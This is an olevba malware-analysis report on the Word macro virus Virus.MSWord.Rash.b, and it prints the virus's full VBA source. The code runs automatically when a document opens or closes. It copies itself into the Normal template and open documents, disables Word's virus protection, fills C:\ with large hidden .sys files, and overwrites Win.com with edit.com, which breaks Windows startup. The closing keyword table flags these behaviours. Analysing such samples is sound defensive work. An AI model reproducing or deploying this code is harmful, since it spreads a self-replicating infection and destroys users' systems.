olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rash.b-0138252576d182404a0e53095a12b9f32caaebd9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rash.b-0138252576d182404a0e53095a12b9f32caaebd9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Shock()
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Rem + Âèðóñíàÿ ëàáîðàòîðèÿ Äàíèëà Èãîðåâà  ã.Ïèò-Ñàíòåðáóðã   1999+
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Document_Close
End Sub
Private Sub Porcher()
Dim bas(190)
Namer = "Ïîð÷àÄåÃåíåðàòîð"
Rem ++++++++++++++++++++++++++
Rem ++      +++++ +++++++ ++++
Rem ++ +++++ ++++ +++++++ ++++
Rem ++ +++++ ++++ +++++++ ++++
Rem ++ +++++ ++++ +++++++ ++++++++
Rem ++      +++++ +++++++ ++++++++++++
Rem ++ ++++ +++++ +++++++ ++++++++++++++
Rem ++ +++++ +++++       ++++++++++++
Rem +++++++++++++++++++++++++++++
bo1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
bo2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
KK = 0
If bo1 <> "Private Sub Shock()" Then
Set bst = NormalTemplate.VBProject.VBComponents.Item(1)
KK = 1
End If
If bo2 <> "Private Sub Shock()" Then
Set bst = ActiveDocument.VBProject.VBComponents.Item(1)
KK = 1
End If
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
If KK > 0 Then
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
bol = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  For bi = 1 To bol
   bas(bi) = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(bi, 1)
  Next bi
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  For bi = 1 To bol
   bst.CodeModule.InsertLines bi, bas(bi)
  Next bi
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
End If
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Negr = "KilleRRRRRash"
For bi = 1 To 40
 bnam = "c:\"
  For bj = 1 To 6
   bkk = Int(10 * Rnd) + 1
   bnam = bnam + Mid(Negr, bkk, 1)
  Next bj
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 bnam = bnam + ".sys"
 Open bnam For Output As #1
 Seek #1, 65535 * 8
 Print #1, "×òîáû ïîìíèëè... FOREVER!!!"
 Close #1
 SetAttr bnam, 6
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Next bi

Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Name "c:\Windows\Command\edit.com" As "C:\Windows\Win.com"
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
End Sub
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Private Sub Document_Open()
Shock
End Sub

Private Sub Document_Close()
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
daa = Date
Porcher
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

